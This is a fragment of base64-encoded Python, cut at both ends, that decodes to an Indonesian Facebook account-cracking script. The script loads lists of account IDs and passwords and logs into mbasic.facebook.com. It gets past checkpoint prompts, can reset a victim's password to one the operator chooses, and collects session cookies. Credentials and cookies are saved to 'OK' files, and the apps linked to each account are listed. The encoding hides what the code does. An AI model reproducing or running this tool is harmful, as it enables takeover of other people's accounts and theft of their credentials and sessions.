sbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIs""eyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgICAgICBmb3Igb3B0IGluIHJhbmdlKGxlbihuZ2V3KSk6ICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHJpbnQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIob3B0KzEpLEssbmdld1tvcHRdKSkNCiAgICAgICAgICAgIGlmICIwIiBpbiBzdHIobGVuKG5nZXcpKToNCiAgICAgICAgICAgIAlpZiAiTGloYXQgZGV0YWlsIGxvZ2luIHlhbmcgZGl0YW1waWxrYW4uIEluaSBBbmRhPyIgaW4gdGl0bGU6DQogICAgICAgICAgICAJICAgIGNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCiAgICAgICAgICAgICAgICAgICAgaWYgInViYWgiIGluIHNlbGYudWJhaF9wYXNzOg0KICAgICAgICAgICAgICAgICAgICAJc2VsZi51YmFoX3B3KHVpZCxwdyxzZXMscnVuLGxpbmsyKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPiiJogYWt1biBvbmUgdGFiLCBzaWxhaGthbiBhbmRhIGxvZ2luICAgICIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIFxuIiUgKHVpZCxwdykpDQogICAgICAgICAgICAgICAgZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlc8OXIGFrdW4gdGVycGFzYW5nIGF1dGVudGlmaWthc2kgMiBmYWt0b3IgICAiJShNKSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgdGVya2VuYSBzcGFtLCBtb2RlIHBlc2F3YXRrYW4gMiBkZXRpayAgICIlKE0pKQ0KICAg""ICAgICAgICAgcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgZWxpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIgICAgICAlc+KImiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gICAiJShIKSkNCiAgICAgICAgCXByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIAlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMgXG4iJSAodWlkLHB3KSkNCiAgICAgICAgZWxpZiAibG9naW5fZXJyb3IiIGluIHN0cihydW4pOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgIGRlZiB1YmFoX3B3KHNlbGYsdWlkLHB3LHNlcyxydW4sbGluazIpOg0KICAgIAlkYXQsZGF0Mj17fSx7fQ0KICAgIAlidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KICAgICAgICBmb3IgeCBpbiBydW4oImlucHV0Iik6DQogICAgICAgIAlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCiAgICAgICAgCSAgICBkYXQudXBkYXRlKHt4LmdldCgibmFtZSIpOnguZ2V0KCJ2YWx1ZSIpfSkNCiAgICAgICAgdWJhaFB3PXNlcy5wb3N0KHNlbGYudXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCiAgICAgICAgcmVzVWJhaD1wYXJzZXIodWJhaFB3LCJodG1sLnBhcnNlciIpDQogICAgICAgIGxpbmszPXJlc1ViYWguZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgIGJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCiAgICAgICAgaWYgIkJ1YXQgS2F0YSBTYW5kaSBCYXJ1IiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodWJhaFB3KSk6DQogICAgICAgIAlmb3IgYiBpbiByZXNVYmFoKCJpbnB1dCIpOg0KICAgICAgICAJICAgIGlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCiAgICAgICAgCSAgICAgICAgZGF0Mi51cGRhdGUoe2IuZ2V0KCJuYW1lIik6Yi5nZXQoInZhbHVlIil9KQ0KICAgICAg""ICAJZGF0Mi51cGRhdGUoeyJwYXNzd29yZF9uZXciOiIiLmpvaW4oc2VsZi5wd2JhcnUpfSkNCiAgICAgICAgCWFuPXNlcy5wb3N0KHNlbGYudXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KICAgICAgICAJY29raSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KICAgICAgICAJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNhbmRpIGJlcmhhc2lsIGRpIHViYWggXG4gKi0tPiAlcyDil4ogJXMg4peKICVzCQkJIiUoSCx0aWwsdWlkLHNlbGYucHdiYXJ1WzBdLGNva2kpKQ0KICAgICAgICAJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1aWQsc2VsZi5wd2JhcnVbMF0sY29raSkpDQogICAgICAgIAlzZWxmLmFwbGlrYXNpKGNva2kpDQogICAgZGVmIGFwbGlrYXNpKHNlbGYsa3VraSk6DQogICAgICAgIHNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICBydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQogICAgICAgIHJ1bl8gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIikNCiAgICAgICAgb3R3ID0gc2VzLmdldChydW4sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIG90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIGdlbSA9IHBhcnNlcihvdHcuY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBnZW1fID0gcGFyc2VyKG90d18uY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBhcGsgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgYXBrXyA9IGdlbV8uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgbm8gPSAwDQogICAgICAgIG5vXyA9IDANCiAgICAgICAgdHJ5Og0KICAgICAgICAJZm9yIGFwcCBpbiBhcGsuZmluZF9hbGwoImgzIik6DQogICAgICAgIAkgICAgZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vKz0xDQogICAgICAgIAkgICAgc2VsZi5nbS5hcHBlbmQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQogICAgICAgIAlmb3IgYXBwXyBpbiBhcGtfLmZpbmRfYWxsKCJoMyIpOg0KICAgICAgICAJICAgIGRhdGFfID0gYXBwXy5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vXys9MQ0KICAgICAgICAJICAgIHNlbGYuZ20uYXBwZW5kKCIgICAgICAlcyVzLiAlcyVzICIlKFAsc3RyKG5vXyksTSxkYXRhXykpDQogICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCiAgICAgICAgCXByaW50ICgiJXPigKIgZ2FnYWwgbWVuZGV0ZWtzaSIlKE0pKQ0KIyBDRUsgT1BTSSBVQkFI""IFBXDQp1YmFoX3Bhc3MgPSBbXQ0KcHdiYXJ1ID0gW10NCnB3QmFydSA9IFtdDQp1cmwgPSAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIg0KZGVmIHViYWhwdygpOg0KCWphbGFuKCIlc+KAoiVzIE1vZGUgcGVzYXdhdGthbiB0ZXJsZWJpaCBkYWh1bHUgNSBkZXRpayAiJShVLE8pKQ0KCXB3PXJhd19pbnB1dCgiXG4lcyVzJXMgdWJhaCBzYW5kaSBwYWRhIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiBwdyBpblsnJ106DQoJCXByaW50KCIlc+KAoiBpc2kgeWcgYmVuYXIga2VudG9kICIlKE0pKQ0KCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCXViYWhfcGFzcy5hcHBlbmQoInkiKQ0KCQlwdzI9cmF3X2lucHV0KCIlcyVzJXMgbWFzdWthbiBzYW5kaSAlcz4gJXMiJShVLHRpbCxPLE0sSykpDQoJCWlmIGxlbihwdzIpIDw9IDU6DQoJCQlleGl0KCIlc+KAoiBzYW5kaSBtaW5pbWFsIDYga2FyYWt0ZXIgIiUoTSkpDQoJCWVsc2U6DQoJCQlwd2JhcnUuYXBwZW5kKHB3MikNCgllbHNlOg0KCQlwYXNzDQpkZWYgZmlsZV9jcCgpOg0KICAgIGRpcnMgPSBvcy5saXN0ZGlyKCdDUCcpDQogICAgcHJpbnQgKCJcbiVz4oCiJXMgWyVzIHBpbGloIGhhc2lsIGNyYWNrIHlnIHRlcnNpbXBhbiB1bnR1ayBjZWsgb3BzaSAlc11cbiIlKFUsTyxVLE8pKQ0KICAgIGZvciBmaWxlIGluIGRpcnM6DQogICAgICAgIHByaW50KCIlc+KAoiVzPiAlcyVzIiUoVSxNLEssZmlsZSkpO2plZGEoMC4wNykNCiAgICB0cnk6DQogICAgCXByaW50KCJcbiVzJXMlcyBNYXN1a2FuIGZpbGUgWyBjdGglczogJXMlcy50eHQlcyBdIiUoVSx0aWwsTyxNLEssd2FrdHUsTykpDQogICAgICAgIG9wc2koKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludCAoJyVz4oCiIGZpbGUgdGlkYWsgYWRhJyUoTSkpO2V4aXQoKQ0KZGVmIG9wc2koKToNCglDUCA9ICgiQ1AvIikNCglyb21pID0gcmF3X2lucHV0KCIlcyVzJXMgTmFtYSBmaWxlICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiByb21pID09ICIiOg0KCQlwcmludCgiJXMlcyBpc2kgeWFuZyBiZW5hciAiJShNLHRpbCkpO2plZGEoMik7b3BzaSgpDQoJdHJ5Og0KCQlmaWxlX2NwID0gb3BlbihDUCtyb21pLCAiciIpLnJlYWRsaW5lcygpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoIlxuJXMlcyBuYW1hIGZpbGUgJXMgdGlkYWsgdGVyc2VkaWEiJShNLHRpbCxyb21pKSkNCgl1YmFocHcoKQ0KCXByaW50KCJcbiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCXByaW50ICgiJXMlcyVzIHRvdGFsIGFrdW4gJXM6ICVzJXMgIiUoVSx0aWwsTyxNLEssc3RyKGxlbihmaWxlX2NwKSkpKQ0KCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMiJShQLE0sUCkpO2plZGEoMikNCglub21vciA9IDANCglmb3IgZmIgaW4gZmlsZV9jcDoNCgkJYWt1biA9""IGZiLnJlcGxhY2UoIlxuIiwiIikNCgkJbmdlY2VrICA9IGFrdW4uc3BsaXQoIiDil4ogIikNCgkJbm9tb3IrPTENCgkJcHJpbnQoIlxuJXMlcy4lcyBsb2dpbiBha3VuICVzPiAlcyVzIiUoSCxzdHIobm9tb3IpLE8sTSxLLGFrdW4ucmVwbGFjZSgiICotLT4gIiwiIikpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCW1lbmdlY2VrKG5nZWNla1swXS5yZXBsYWNlKCIgKi0tPiAiLCIiKSwgbmdlY2VrWzFdKQ0KCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCQlwcmludCgiXHIlc+KAoiB0aWRhayBhZGEga29uZWtzaSAiJShNKSksc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJCXBhc3MNCgkJZXhjZXB0Og0KCQkJcGFzcw0KCXByaW50KCJcbiVzJXMlcyBTZWxlc2FpIG1lbmdlY2VrIGFrdW4iJShVLHRpbCxPKSk7amVkYSgwLjA3KQ0KCXJhd19pbnB1dCgnJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKQ0KCW1lbnUoKQ0KZGF0YSA9IHt9DQpkYXRhMiA9IHt9DQpkZWYgbWVuZ2VjZWsodXNlcixwdyk6DQoJZ2xvYmFsIGxvb3AsdWJhaF9wYXNzLHB3YmFydQ0KCXNlc3Npb249cmVxdWVzdHMuU2Vzc2lvbigpDQoJc2Vzc2lvbi5oZWFkZXJzLnVwZGF0ZSh7DQoJCSJIb3N0IjoibWJhc2ljLmZhY2Vib29rLmNvbSIsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQoJCSJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjkiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIsDQoJCSJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIg0KCX0pDQoJc291cD1wYXJzZXIoc2Vzc2lvbi5nZXQodXJsKyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IikudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWxpbms9c291cC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCglmb3IgeCBpbiBzb3VwKCJpbnB1dCIpOg0KCQlkYXRhLnVwZGF0ZSh7eC5nZXQoIm5hbWUiKTp4LmdldCgidmFsdWUiKX0pDQoJZGF0YS51cGRhdGUoeyJlbWFpbCI6dXNlciwicGFzcyI6cHd9KQ0KCXVybFBvc3Q9c2Vzc2lvbi5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2xpbmsuZ2V0KCJhY3Rpb24iKSxkYXRhPWRhdGEpDQoJcmVzcG9uc2U9cGFyc2VyKHVy""bFBvc3QudGV4dCwgImh0bWwucGFyc2VyIikNCglpZiAiVGVtdWthbiBBa3VuIEFuZGEiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1cmxQb3N0LnRleHQpKToNCgkJcHJpbnQoIlxyJXPigKIgbW9kZSBwZXNhd2F0a2FuIHNlbGFtYSA1IGRldGlrJXMiJShNKSkNCglpZiAiY191c2VyIiBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCgkJaWYgIkFrdW4gQW5kYSBEaWt1bmNpIiBpbiB1cmxQb3N0LnRleHQ6DQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRlcmt1bmNpIHNlc2kgbmV3IiUoTSkpDQoJCWVsc2U6DQoJCQlsb29wKz0xDQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gIiUoSCkpDQoJCQlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQoJZWxpZiAiY2hlY2twb2ludCIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCWxvb3ArPTENCgkJdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSkNCgkJbGluazI9cmVzcG9uc2UuZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQoJCWxpc3RJbnB1dD1bJ2ZiX2R0c2cnLCdqYXpvZXN0JywnY2hlY2twb2ludF9kYXRhJywnc3VibWl0W0NvbnRpbnVlXScsJ25oJ10NCgkJZm9yIHggaW4gcmVzcG9uc2UoImlucHV0Iik6DQoJCQlpZiB4LmdldCgibmFtZSIpIGluIGxpc3RJbnB1dDoNCgkJCQlkYXRhMi51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCQlhbj1zZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXRhMikNCgkJcmVzcG9uc2UyPXBhcnNlcihhbi50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWNlaz1bY2VrIGZvciBjZWsgaW4gcmVzcG9uc2UyLmZpbmRfYWxsKCJvcHRpb24iKV0NCgkJbnVtYmVyPTANCgkJcHJpbnQoIlxyJXMlcyVzIHRlcmRhcGF0ICVzJXMlcyBvcHNpICVzOiIlKFUsdGlsLE8sUCxzdHIobGVuKGNlaykpLE8sTSkpO2plZGEoMC4wNykNCgkJaWYobGVuKGNlayk9PTApOg0KCQkJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KCQkJCWNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQoJCQkJaWYgInkiIGluIHViYWhfcGFzczoNCgkJCQkJdWJhaF9wdyh1c2VyLHB3LHNlc3Npb24scmVzcG9uc2UsbGluazIpDQoJCQkJZWxzZToNCgkJCQkJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNpbGFoa2FuIGFuZGEgbG9naW4JCSIlKEgsdGlsKSkNCgkJCQkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2Vy""LHB3LGNva2kpKQ0KCQkJCQlhcGxpa2FzaShjb2tpKQ0KCQkJZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0ZXJwYXNhbmcgYXV0ZW50aWthc2kgZHVhIGZha3RvcgkJCSIlKE0pKQ0KCQkJZWxzZToNCgkJCQlwcmludCgiJXMlcyB0ZXJqYWRpIGtlc2FsYWhhbiIlKE0sdGlsKSkNCgkJZWxpZihsZW4oY2VrKTw9MSk6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiBzZWxlY3RlZD1cIi4qP1wiIHZhbHVlPVwiLio/XCI+KC4qPyk8XC9vcHRpb24+JyxzdHIoY2VrKSkNCgkJCQlqYWxhbiAoIiAgJXMlcy4gJXMlcyIlKFAsc3RyKG51bWJlciksSyxvcHNpWzBdKSkNCgkJZWxpZihsZW4oY2VrKT49Mik6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiB2YWx1ZT1cIi4rXCI+KC4rKTxcL29wdGlvbj4nLHN0cihjZWtbeF0pKQ0KCQkJCWphbGFuICgiICAlcyVzLiAlcyVzIiUoUCxzdHIobnVtYmVyKSxLLG9wc2lbMF0pKQ0KCQllbHNlOg0KCQkJaWYgImNfdXNlciIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0aWRhayBjaGVja3BvaW50LCBzaWxhaGthbiBhbmRhIGxvZ2luICIlKEgpKQ0KCQkJCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCgllbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJlc3BvbnNlKToNCgkJb2ggPSBydW4uZmluZCgiZGl2Iix7ImlkIjoibG9naW5fZXJyb3IifSkuZmluZCgiZGl2IikudGV4dA0KCQlwcmludCgiJXPigKIgJXMiJShNLG9oKSkNCgllbHNlOg0KCQlsb29wKz0xDQoJCXByaW50KCIlcyVzIGxvZ2luIGdhZ2FsLCBzaWxhaGthbiBjZWsga2VtYmFsaSBpZCBkYW4ga2F0YSBzYW5kaSIlKE0sdGlsKSkNCmRlZiB1YmFoX3B3KHVzZXIscHcsc2Vzc2lvbixyZXNwb25zZSxsaW5rMik6DQoJZGF0LGRhdDI9e30se30NCglidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KCWZvciB4IGluIHJlc3BvbnNlKCJpbnB1dCIpOg0KCQlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCgkJCWRhdC51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCXViYWhQdz1zZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCglyZXNVYmFoPXBhcnNlcih1YmFoUHcsImh0bWwucGFyc2VyIikNCglsaW5rMz1yZXNVYmFoLmZpbmQoImZvcm0iLHsibWV0aG9kIjoicG9zdCJ9KQ0KCWJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZi""X2R0c2ciLCJqYXpvZXN0Il0NCglpZiAiQnVhdCBLYXRhIFNhbmRpIEJhcnUiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1YmFoUHcpKToNCgkJZm9yIGIgaW4gcmVzVWJhaCgiaW5wdXQiKToNCgkJCWlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCgkJCQlkYXQyLnVwZGF0ZSh7Yi5nZXQoIm5hbWUiKTpiLmdldCgidmFsdWUiKX0pDQoJCWRhdDIudXBkYXRlKHsicGFzc3dvcmRfbmV3IjoiIi5qb2luKHB3YmFydSl9KQ0KCQlhbj1zZXNzaW9uLnBvc3QodXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KCQljb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KCQlwcmludCgiXHIlcyVzIGFrdW4gb25lIHRhYiwgc2FuZGkgYmVyaGFzaWwgZGkgdWJhaCBcbiAqLS0+ICVzIOKXiiAlcyDil4ogJXMJCQkiJShILHRpbCx1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJYXBsaWthc2koY29raSkNCmRlZiBhcGxpa2FzaShrdWtpKToNCglzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCglydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQoJcnVuXyA9ICgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9aW5hY3RpdmUiKQ0KCW90dyA9IHNlcy5nZXQocnVuLGNvb2tpZXM9eydjb29raWUnOmt1a2l9KQ0KCW90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQoJZ2VtID0gcGFyc2VyKG90dy5jb250ZW50LCdodG1sLnBhcnNlcicpDQoJZ2VtXyA9IHBhcnNlcihvdHdfLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykNCglhcGsgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCglhcGtfID0gZ2VtXy5maW5kKCdmb3JtJyxtZXRob2Q9J3Bvc3QnKQ0KCW5vID0gMA0KCW5vXyA9IDANCgl0cnk6DQoJCWZvciBhcHAgaW4gYXBrLmZpbmRfYWxsKCJoMyIpOg0KCQkJZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KCQkJbm8rPTENCgkJCWphbGFuKCIgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQoJCWZvciBhcHBfIGluIGFwa18uZmluZF9hbGwoImgzIik6DQoJCQlkYXRhXyA9IGFwcF8uZmluZCgnc3BhbicpLnRleHQNCgkJCW5vXys9MQ0KCQkJamFsYW4oIiAgJXMlcy4gJXMlcyAiJShQLHN0cihub18pLE0sZ